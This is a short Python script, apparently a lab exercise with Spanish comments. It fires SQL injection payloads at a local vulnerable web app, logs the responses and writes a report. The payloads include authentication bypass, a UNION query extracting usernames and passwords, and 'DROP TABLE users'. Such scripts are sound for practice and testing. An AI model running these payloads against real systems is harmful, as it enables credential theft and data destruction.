import requests
import logging
from datetime import datetime

##COnfiguracion del registro 
logging.basicConfig(
    filename='injection_test.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

##Lista de Payloads
PAYLOADS = [
    "' OR '1'='1 --",
    "' UNION SELECT username, password FROM users --",
    "' AND '1'='1 --",
    "' UNION SELECT NULL --",
    "' UNION SELECT * FROM nonexistent_table --",
    "'; DROP TABLE users; --"
]

##Registra el resultado de cada prueba de inyeccion
def log_results(payload: str, result: str) -> None:
    logging.info(f'Payload: {payload} - Resultado: {result}')

##Funcion para generar el reporte de las inyecciones realizdas
def generate_report(results: dict) -> None:
    report_filename = (
        f'reporte_inyeccion_sql_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
    )
    with open(report_filename, 'w') as report_file:
        report_file.write("###########################################")
        report_file.write("=== Reporte de Pruebas de Inyección SQL ===")
        report_file.write("###########################################\n")
        report_file.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for payload, result in results.items():
            report_file.write(f"Payload: {payload}\nResultado: {result}\n\n")
    print(f"[+] Reporte guardado en: {report_filename}")

##Funcion para ejecutar las pruebas de inyeccion SQL en la aplicacion web vulnerable
def test_sql_injection() -> dict:
    results = {}

    for payload in PAYLOADS:
        try:
            response = requests.get(
                f'http://127.0.0.1:5000/vulnerable?input={payload}'
            )
            if response.status_code == 200:
                results[payload] = "[+] Inyección exitosa: " + response.text
            else:
                results[payload] = (
                    f"[!] Error en la consulta: Código de estado {response.status_code}"
                )
        except requests.exceptions.RequestException as e:
            results[payload] = f"[!] Error en la conexión: {e}"
        except Exception as e:
            results[payload] = f"[!] Error inesperado: {e}"

        log_results(payload, results[payload])

    return results

if __name__ == "__main__":
    test_results = test_sql_injection()
    generate_report(test_results)
